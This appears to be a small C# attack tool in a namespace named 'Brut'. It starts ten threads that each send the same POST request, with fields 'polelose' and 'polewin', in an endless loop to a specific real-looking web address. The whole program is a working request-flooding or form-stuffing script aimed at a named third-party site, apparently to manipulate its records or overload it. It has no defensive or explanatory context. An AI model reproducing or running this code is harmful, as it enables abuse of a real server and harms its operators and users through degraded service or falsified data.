using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Policy;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;
using System.Threading;

namespace Brut
{

    class Program
    {
        //static WebResponse POST(string Url, string Data)
        //{
        //    WebRequest req = WebRequest.Create(Url);
        //    req.Method = "POST";
        //    req.Timeout = 100000;
        //    req.ContentType = "application/x-www-form-urlencoded";
        //    byte[] sentData = Encoding.GetEncoding(1251).GetBytes(Data);
        //    req.ContentLength = sentData.Length;
        //    Stream sendStream = req.GetRequestStream();
        //    sendStream.Write(sentData, 0, sentData.Length);
        //    sendStream.Close();
        //    return req.GetResponse();
        //}

        //public static HttpWebResponse PostMethod(string postUrl, string postedData)
        //{
        //    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(postUrl);
        //    request.Method = "POST";
        //    request.Credentials = CredentialCache.DefaultCredentials;

        //    UTF8Encoding encoding = new UTF8Encoding();
        //    var bytes = encoding.GetBytes(postedData);

        //    request.ContentType = "application/x-www-form-urlencoded";
        //    request.ContentLength = bytes.Length;

        //    using (var newStream = request.GetRequestStream())
        //    {
        //        newStream.Write(bytes, 0, bytes.Length);
        //        newStream.Close();
        //    }
            
        //    return (HttpWebResponse)request.GetResponse();
        //}

        private static void Main(string[] args)
        {
            int i = 0;
            while (i++<10)
            {
                try
                {
                    MyClass myClass = new MyClass();
                    Thread InstanceCaller = new Thread(new ThreadStart(myClass.NewFunction));
                    InstanceCaller.Start();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
               
            }


        }

    }

    class MyClass
    {
        public void NewFunction()
        {
            string url = "http://dugirlkg.bget.ru/index.php";
            string data = "polelose=26291646&polewin=53629810";//"//53629810";
            int i = 0;
            while (true)
            {
                try
                {

                    POST(url, data);
                    Console.WriteLine(i++);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
            }

        }

        private static void POST(string Url, string Data)
        {
            WebRequest req = WebRequest.Create(Url);
            req.Method = "POST";
            req.Timeout = 100000;
            req.ContentType = "application/x-www-form-urlencoded";
            byte[] sentData = Encoding.GetEncoding(1251).GetBytes(Data);
            req.ContentLength = sentData.Length;
            Stream sendStream = req.GetRequestStream();
            sendStream.Write(sentData, 0, sentData.Length);
            sendStream.Close();
            WebResponse res = req.GetResponse();
            Stream ReceiveStream = res.GetResponseStream();
            StreamReader sr = new StreamReader(ReceiveStream, Encoding.UTF8);
            //Кодировка указывается в зависимости от кодировки ответа сервера
            Char[] read = new Char[256];
            int count = sr.Read(read, 0, 256);
            string Out = String.Empty;
            while (count > 0)
            {
                String str = new String(read, 0, count);
                Out += str;
                count = sr.Read(read, 0, 256);
            }
            //return Out;
        }
    }
}
